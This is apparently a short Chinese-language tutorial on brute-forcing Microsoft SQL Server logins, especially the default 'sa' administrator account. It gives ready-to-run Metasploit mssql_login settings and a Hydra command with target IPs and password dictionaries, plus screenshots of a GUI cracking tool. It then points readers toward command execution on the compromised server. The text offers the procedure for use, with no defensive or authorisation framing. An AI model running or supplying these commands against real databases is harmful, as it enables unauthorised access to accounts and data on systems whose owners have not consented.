```
工具：hydra、超级弱口令爆破工具、metasploit
```

## 工具：metasploit

```bash
msf > use auxiliary/scanner/mssql/mssql_login （使用mssql_login 模块） 
msf auxiliary(mssql_login) > show options （查看选项） 
msf auxiliary(mssql_login) > set RHOSTS 10.107.0.64（目标） 
msf auxiliary(mssql_login) > set USER_FILE /root/username.txt（用户名字典） 
msf auxiliary(mssql_login) > set PASS_FILE /root/pass.txt（密码字典文件） 
msf auxiliary(mssql_login) > exploit（开始）
```

字典文件我放在密码集里面了

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/20adc0e0d2ed.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/e550cdbb885c.png)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/62e27bf1c684.webp)

## 工具：超级弱口令爆破工具

sa是SuperAdministrator的简称，

Sqlserver的默认管理员帐户。

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/3a411bdf9275.webp)

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/60efb21b12ff.webp)

## 工具：hydra

hydra是一个自动化的爆破工具，暴力破解弱密码，是一个支持众多协议的爆破工具，已经集成到KaliLinux中，

直接在终端打开即可。

hydra支持的服务有：POP3，SMTP、SMB，RDP，SSH，FTP，POP3，Telnet，MYSQL...

终端输入 **hydra -h**查看使用方法

![](https://cdn.jsdelivr.net/gh/P7IVESC/img@main/2026/11/fa52cf487449.webp)

```bash
hydra -l sa -P dic_password_sqlserver.txt mssql://10.3.4.118 -V
```

进一步的命令执行可参考SQL server命令执行

<!-- build: 2026-11-06 11:43:53 -->